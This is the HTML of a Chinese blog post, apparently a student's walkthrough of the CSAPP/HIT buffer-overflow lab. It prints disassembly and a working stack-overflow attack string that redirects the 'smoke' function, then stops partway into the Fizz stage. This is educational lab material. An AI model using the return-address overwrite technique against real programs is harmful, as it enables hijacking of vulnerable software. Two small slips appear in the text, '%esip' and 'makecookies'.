@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Zinker's hikari" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="因为CSAPP的实验是AttackLab，然而哈工大的实验是BuffLab（应该是老版或者是自创），总之在网路上很难找到相关的教程资源，所以我写完32位的时候，决定写一个实验的repo，来记录一下实验的过程，同时也是对知识的回顾。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CSAPP AttackLab 哈工大版 bufflab">
+<meta property="og:url" content="http://yoursite.com/CSAPP-AttackLab-哈工大版-bufflab/index.html">
+<meta property="og:site_name" content="Zinker&#39;s hikari">
+<meta property="og:description" content="因为CSAPP的实验是AttackLab，然而哈工大的实验是BuffLab（应该是老版或者是自创），总之在网路上很难找到相关的教程资源，所以我写完32位的时候，决定写一个实验的repo，来记录一下实验的过程，同时也是对知识的回顾。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/CSAPP-AttackLab-哈工大版-bufflab/image-20181122000717488.png">
+<meta property="og:image" content="http://yoursite.com/CSAPP-AttackLab-哈工大版-bufflab/image-20181122002831104.png">
+<meta property="og:image" content="http://yoursite.com/CSAPP-AttackLab-哈工大版-bufflab/image-20181122011656564.png">
+<meta property="og:updated_time" content="2018-11-21T20:29:56.906Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CSAPP AttackLab 哈工大版 bufflab">
+<meta name="twitter:description" content="因为CSAPP的实验是AttackLab，然而哈工大的实验是BuffLab（应该是老版或者是自创），总之在网路上很难找到相关的教程资源，所以我写完32位的时候，决定写一个实验的repo，来记录一下实验的过程，同时也是对知识的回顾。">
+<meta name="twitter:image" content="http://yoursite.com/CSAPP-AttackLab-哈工大版-bufflab/image-20181122000717488.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/CSAPP-AttackLab-哈工大版-bufflab/"/>
+
+
+
+
+
+  <title>CSAPP AttackLab 哈工大版 bufflab | Zinker's hikari</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Zinker's hikari</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">一人である</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/CSAPP-AttackLab-哈工大版-bufflab/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Zinker">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Zinker's hikari">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CSAPP AttackLab 哈工大版 bufflab</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-21T00:30:15+08:00">
+                2018-11-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  7.2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  32
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <pre><code>因为CSAPP的实验是AttackLab，然而哈工大的实验是BuffLab（应该是老版或者是自创），总之在网路上很难找到相关的教程资源，所以我写完32位的时候，决定写一个实验的repo，来记录一下实验的过程，同时也是对知识的回顾。
+</code></pre><a id="more"></a>
+<h1 id="总体来看一下"><a href="#总体来看一下" class="headerlink" title="总体来看一下"></a>总体来看一下</h1><p>​    CSAPP的第三个实验，和BombLab一样挂钩于CSAPP课本的第三章，也就是主讲汇编语言的一章。与BombLab不同的是，AttackLab需要你自己去写汇编代码，而BombLab是需要你看懂汇编语言的程序。当然，如果你不像我一样忙得要死，还要肝的话。推荐在做这两个实验之前，将《<em>汇编语言</em>:<em>基于</em>x86处理器》学习完，那样的话，才真正达到了学习这门课的目的。</p>
+<p>​    好了，言归正传。回到实验本身，哈工大的BuffLab实验包中有三个文件：</p>
+<ul>
+<li><p>bufbomb：也就是我们需要攻击的代码。</p>
+</li>
+<li><p>hex2raw : 将16进制的字符串转化为攻击需要的字符串。</p>
+</li>
+<li><p>makecookie：根据学号产生，一般是要求返回值为cookie值。</p>
+<p>那么，我们就开始进行实验的准备。</p>
+</li>
+</ul>
+<h1 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h1><p>​    那么，首先最重要的就是GDB、Objdump了。</p>
+<p>我们需要利用objdump去进行反汇编程序，因为我们一开始得到的包中的程序是不能直接得到它的汇编代码的，而我们需要利用objdump的命令去得到包中程序的汇编代码。命令如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d bufbomb &gt; bufbomb.txt</span><br></pre></td></tr></table></figure>
+<p>​    之后，我们就能在文件夹中看到bufbomb的所有汇编代码了。</p>
+<p>​    GDB是我们在进行3-5的攻击的时候，需要使用来对我们的汇编代码进行编译。命令如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -c asm.s</span><br></pre></td></tr></table></figure>
+<p>​    好的，介绍完我们在环境中需要做的准备，我们就介绍一下实验包中的三个文件的使用方法。</p>
+<h2 id="bufbomb"><a href="#bufbomb" class="headerlink" title="bufbomb"></a>bufbomb</h2><p>​    首先我们来介绍一下bufbomb这个命令。这个命令是开启整个文件的一个基础命令，它的进阶的命令是-n/-u，其中在smoke、fizz、bang和boom实验中我们将会应用如下的语句：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bufbomb -u <span class="number">1170300532</span></span><br></pre></td></tr></table></figure>
+<p>​    其中，第二个参数是你的学号，也就是说你会通过你的学号去在bufbomb中确认一个固定的值，而你的目标就是想办法利用这个值。</p>
+<p>​    在nitro中我们将会应用如下的语句：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bufbomb -n -u <span class="number">1170300532</span></span><br></pre></td></tr></table></figure>
+<p>​    其中第一个参数是开启getbufn和testn两个函数，也就是说我们在nitro中，需要调用和其他四个实验中不同的函数，关于函数的区别我们等到nitro的时候再详述。</p>
+<h2 id="makecookie"><a href="#makecookie" class="headerlink" title="makecookie"></a>makecookie</h2><p>​    这个命令的功能和参数都十分简单，根据你输入的学号给出一个特定的序列称为cookie，你需要输入的命令是：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./makecookies <span class="number">1170300532</span></span><br></pre></td></tr></table></figure>
+<p>之后运行的结果是：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">21</span> <span class="number">23</span>:<span class="number">58</span></span><br><span class="line">zinker &gt;&gt;&gt; ./makecookie <span class="number">1170300532</span></span><br><span class="line"><span class="number">0</span>x676fa3c9</span><br></pre></td></tr></table></figure>
+<p>而显示出生成的0x676fa3c9就是你的独一无二的cookie。</p>
+<h2 id="hex2raw"><a href="#hex2raw" class="headerlink" title="hex2raw"></a>hex2raw</h2><p>​    我们通过这个命令来把我们自己输入的字符串转换为16进制的格式，格式如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt;smoke_1170300532.txt&gt; smoke_raw_1170300532.txt</span><br></pre></td></tr></table></figure>
+<p>​    这样我们就可以将我们自己写的字符串转化为计算机能够读懂的格式。</p>
+<h1 id="Smoke"><a href="#Smoke" class="headerlink" title="Smoke"></a>Smoke</h1><p>​    好的，那么我们开始进行第一个实验，第一个实验的名称是Smoke，它的函数原型如下所示：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">smoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Smoke!: You called smoke()\n"</span>);</span><br><span class="line">    validate(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​    根据ppt或者是CMU的第0个实验的实验指南我们可以得到，Smoke任务是构造攻击字符串，输入程序中后造成缓冲区溢出，从而使得在使用getbuf()返回时不返回到test()函数，而是返回到smoke()函数。攻击成功时如下：</p>
+<p><img src="/CSAPP-AttackLab-哈工大版-bufflab/image-20181122000717488.png" alt="image-20181122000717488"></p>
+<p>​    好的根据提示，我们先分别查看一下getbuf、smoke、test函数的汇编代码。首先使用</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d bufbomb &gt; bufbomb.txt</span><br></pre></td></tr></table></figure>
+<p>​    这条指令去获得整个bufbomb包的所有函数的汇编代码，然后找到三个函数的位置。</p>
+<p>其中，三个函数的代码如下图所示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">08048bbb &lt;smoke&gt;:</span><br><span class="line"> 8048bbb:	55                   	push   %ebp</span><br><span class="line"> 8048bbc:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048bbe:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048bc1:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bc4:	68 c0 a4 04 08       	push   $0x804a4c0</span><br><span class="line"> 8048bc9:	e8 92 fd ff ff       	call   8048960 &lt;puts@plt&gt;</span><br><span class="line"> 8048bce:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bd1:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048bd4:	6a 00                	push   $0x0</span><br><span class="line"> 8048bd6:	e8 f0 08 00 00       	call   80494cb &lt;validate&gt;</span><br><span class="line"> 8048bdb:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 8048bde:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8048be1:	6a 00                	push   $0x0</span><br><span class="line"> 8048be3:	e8 88 fd ff ff       	call   8048970 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">08049378 &lt;getbuf&gt;:</span><br><span class="line"> 8049378:	55                   	push   %ebp</span><br><span class="line"> 8049379:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 804937b:	83 ec 28             	sub    $0x28,%esp</span><br><span class="line"> 804937e:	83 ec 0c             	sub    $0xc,%esp</span><br><span class="line"> 8049381:	8d 45 d8             	lea    -0x28(%ebp),%eax</span><br><span class="line"> 8049384:	50                   	push   %eax</span><br><span class="line"> 8049385:	e8 9e fa ff ff       	call   8048e28 &lt;Gets&gt;</span><br><span class="line"> 804938a:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 804938d:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 8049392:	c9                   	leave  </span><br><span class="line"> 8049393:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08048</span>c94 &lt;test&gt;:</span><br><span class="line"> <span class="number">8048</span>c94:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line"> <span class="number">8048</span>c95:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line"> <span class="number">8048</span>c97:	<span class="number">83</span> ec <span class="number">18</span>             	sub    <span class="variable">$0x18</span>,%esp</span><br><span class="line"> <span class="number">8048</span>c9a:	e8 <span class="number">64</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       	call   <span class="number">8049103</span> &lt;uniqueval&gt;</span><br><span class="line"> <span class="number">8048</span>c9f:	<span class="number">89</span> <span class="number">45</span> f0             	mov    %eax,-<span class="number">0</span>x10(%ebp)</span><br><span class="line"> <span class="number">8048</span>ca2:	e8 d1 <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>       	call   <span class="number">8049378</span> &lt;getbuf&gt;</span><br><span class="line"> <span class="number">8048</span>ca7:	<span class="number">89</span> <span class="number">45</span> f4             	mov    %eax,-<span class="number">0</span>xc(%ebp)</span><br><span class="line"> <span class="number">8048</span>caa:	e8 <span class="number">54</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>       	call   <span class="number">8049103</span> &lt;uniqueval&gt;</span><br><span class="line"> <span class="number">8048</span>caf:	<span class="number">89</span> c2                	mov    %eax,%edx</span><br><span class="line"> <span class="number">8048</span>cb1:	<span class="number">8</span>b <span class="number">45</span> f0             	mov    -<span class="number">0</span>x10(%ebp),%eax</span><br><span class="line"> <span class="number">8048</span>cb4:	<span class="number">39</span> c2                	cmp    %eax,%edx</span><br><span class="line"> <span class="number">8048</span>cb6:	<span class="number">74</span> <span class="number">12</span>                	je     <span class="number">8048</span>cca &lt;test+<span class="number">0</span>x36&gt;</span><br><span class="line"> <span class="number">8048</span>cb8:	<span class="number">83</span> ec <span class="number">0</span>c             	sub    <span class="variable">$0xc</span>,%esp</span><br><span class="line"> <span class="number">8048</span>cbb:	<span class="number">68</span> <span class="number">60</span> a5 <span class="number">04</span> <span class="number">08</span>       	push   <span class="variable">$0x804a560</span></span><br><span class="line"> <span class="number">8048</span>cc0:	e8 <span class="number">9</span>b fc ff ff       	call   <span class="number">8048960</span> &lt;puts@plt&gt;</span><br><span class="line"> <span class="number">8048</span>cc5:	<span class="number">83</span> c4 <span class="number">10</span>             	add    <span class="variable">$0x10</span>,%esp</span><br><span class="line"> <span class="number">8048</span>cc8:	eb <span class="number">41</span>                	jmp    <span class="number">8048</span>d0b &lt;test+<span class="number">0</span>x77&gt;</span><br><span class="line"> <span class="number">8048</span>cca:	<span class="number">8</span>b <span class="number">55</span> f4             	mov    -<span class="number">0</span>xc(%ebp),%edx</span><br><span class="line"> <span class="number">8048</span>ccd:	a1 <span class="number">58</span> e1 <span class="number">04</span> <span class="number">08</span>       	mov    <span class="number">0</span>x804e158,%eax</span><br><span class="line"> <span class="number">8048</span>cd2:	<span class="number">39</span> c2                	cmp    %eax,%edx</span><br><span class="line"> <span class="number">8048</span>cd4:	<span class="number">75</span> <span class="number">22</span>                	jne    <span class="number">8048</span>cf8 &lt;test+<span class="number">0</span>x64&gt;</span><br><span class="line"> <span class="number">8048</span>cd6:	<span class="number">83</span> ec <span class="number">08</span>             	sub    <span class="variable">$0x8</span>,%esp</span><br><span class="line"> <span class="number">8048</span>cd9:	ff <span class="number">75</span> f4             	pushl  -<span class="number">0</span>xc(%ebp)</span><br><span class="line"> <span class="number">8048</span>cdc:	<span class="number">68</span> <span class="number">89</span> a5 <span class="number">04</span> <span class="number">08</span>       	push   <span class="variable">$0x804a589</span></span><br><span class="line"> <span class="number">8048</span>ce1:	e8 <span class="number">9</span>a fb ff ff       	call   <span class="number">8048880</span> &lt;printf@plt&gt;</span><br><span class="line"> <span class="number">8048</span>ce6:	<span class="number">83</span> c4 <span class="number">10</span>             	add    <span class="variable">$0x10</span>,%esp</span><br><span class="line"> <span class="number">8048</span>ce9:	<span class="number">83</span> ec <span class="number">0</span>c             	sub    <span class="variable">$0xc</span>,%esp</span><br><span class="line"> <span class="number">8048</span>cec:	<span class="number">6</span>a <span class="number">03</span>                	push   <span class="variable">$0x3</span></span><br><span class="line"> <span class="number">8048</span>cee:	e8 d8 <span class="number">07</span> <span class="number">00</span> <span class="number">00</span>       	call   <span class="number">80494</span>cb &lt;validate&gt;</span><br><span class="line"> <span class="number">8048</span>cf3:	<span class="number">83</span> c4 <span class="number">10</span>             	add    <span class="variable">$0x10</span>,%esp</span><br><span class="line"> <span class="number">8048</span>cf6:	eb <span class="number">13</span>                	jmp    <span class="number">8048</span>d0b &lt;test+<span class="number">0</span>x77&gt;</span><br><span class="line"> <span class="number">8048</span>cf8:	<span class="number">83</span> ec <span class="number">08</span>             	sub    <span class="variable">$0x8</span>,%esip</span><br><span class="line"> <span class="number">8048</span>cfb:	ff <span class="number">75</span> f4             	pushl  -<span class="number">0</span>xc(%ebp)</span><br><span class="line"> <span class="number">8048</span>cfe:	<span class="number">68</span> a6 a5 <span class="number">04</span> <span class="number">08</span>       	push   <span class="variable">$0x804a5a6</span></span><br><span class="line"> <span class="number">8048</span>d03:	e8 <span class="number">78</span> fb ff ff       	call   <span class="number">8048880</span> &lt;printf@plt&gt;</span><br><span class="line"> <span class="number">8048</span>d08:	<span class="number">83</span> c4 <span class="number">10</span>             	add    <span class="variable">$0x10</span>,%esp</span><br><span class="line"> <span class="number">8048</span>d0b:	<span class="number">90</span>                   	nop</span><br><span class="line"> <span class="number">8048</span>d0c:	c9                   	leave  </span><br><span class="line"> <span class="number">8048</span>d0d:	c3                   	ret</span><br></pre></td></tr></table></figure>
+<p>​        我们不要被很长的汇编代码吓到，因为他们真正有用的部分不过几行罢了，我们这个实验的真正目的就是让大家知道怎么确定哪里的汇编代码有效，哪些对解决问题没有帮助。根据提示的要求，我们先看一下getbuf函数。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">08049378</span> &lt;getbuf&gt;:</span><br><span class="line"> <span class="number">8049378</span>:	<span class="number">55</span>                   	push   %ebp</span><br><span class="line"> <span class="number">8049379</span>:	<span class="number">89</span> e5                	mov    %esp,%ebp</span><br><span class="line"> <span class="number">804937</span>b:	<span class="number">83</span> ec <span class="number">28</span>             	sub    <span class="variable">$0x28</span>,%esp</span><br><span class="line"> <span class="number">804937</span>e:	<span class="number">83</span> ec <span class="number">0</span>c             	sub    <span class="variable">$0xc</span>,%esp</span><br><span class="line"> <span class="number">8049381</span>:	<span class="number">8</span>d <span class="number">45</span> d8             	lea    -<span class="number">0</span>x28(%ebp),%eax</span><br><span class="line"> <span class="number">8049384</span>:	<span class="number">50</span>                   	push   %eax</span><br><span class="line"> ....</span><br></pre></td></tr></table></figure>
+<p>​    根据以上的语句我们可以看出，esp是栈顶指针，而ebp是栈帧的指针，我们先从栈顶开始，然后第一个sub语句是建立了多深的缓冲区，而此时ebp仍然是指向栈顶的，所以lea语句，将栈顶的位置传递给了eax这个寄存器，所以根据以上的信息，我们可以认定getbuf所申请的缓冲区一共是0x28也就是40个字节。那么我们的目的就很明显了，也就是通过我们对栈进行溢出的操作使得getbuf的返回地址变更为smoke的地址。那么我们就来看一下32位系统的栈帧结构：</p>
+<p><img src="/CSAPP-AttackLab-哈工大版-bufflab/image-20181122002831104.png" alt="image-20181122002831104"></p>
+<p>​    从这个栈帧结构中我们可以看出我们要攻击的就是返回地址区域，那么根据我们之前的汇编代码我们就可以确定出我们最后的攻击字符串应该是什么样子的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">00 00 00 00</span><br><span class="line">一开始申请的40字节</span><br><span class="line">00 00 00 00  test() ebp的值</span><br><span class="line">bb 8b 04 08	 目标smoke的地址</span><br></pre></td></tr></table></figure>
+<p> 攻击结果如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ubuntu/home/zinker/lab4/buflab-handout-<span class="number">32</span>-O0 - - - - - - - - - - <span class="number">18</span>-<span class="number">11</span>-<span class="number">20</span> <span class="number">22</span>:<span class="number">28</span></span><br><span class="line">zinker &gt;&gt;&gt; cat smoke_in.txt|./hex2raw | ./bufbomb -u <span class="number">1170300532</span></span><br><span class="line">Userid: <span class="number">1170300532</span></span><br><span class="line">Cookie: <span class="number">0</span>x676fa3c9</span><br><span class="line">Type string:Smoke!: You called smoke()</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
+<p>那么到此为止，第一个实验完成。</p>
+<h1 id="Fizz"><a href="#Fizz" class="headerlink" title="Fizz"></a>Fizz</h1><p>​    好的，那么我们接下来进行第二个实验。这个实验叫做fizz。它的函数原型如下所示：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fizz</span><span class="params">(<span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(val == cookie)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Fizz!: You called fizz(0x%x)\n"</span>,val);</span><br><span class="line">        validate(<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire!: You called fizz(0x%x)\n"</span>,val);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​    仍然是，根据ppt的内容我们可以得到一些提示，解决这个攻击需要我们构造攻击字符串使得缓冲区溢出，使得目标程序调用fizz函数，并且将cookie的值作为参数传递给fizz函数，使得fizz函数的判断成功。</p>
+<p>​    好的，我们依旧按照顺序，先找到fizz对应的汇编代码，代码如下</p>
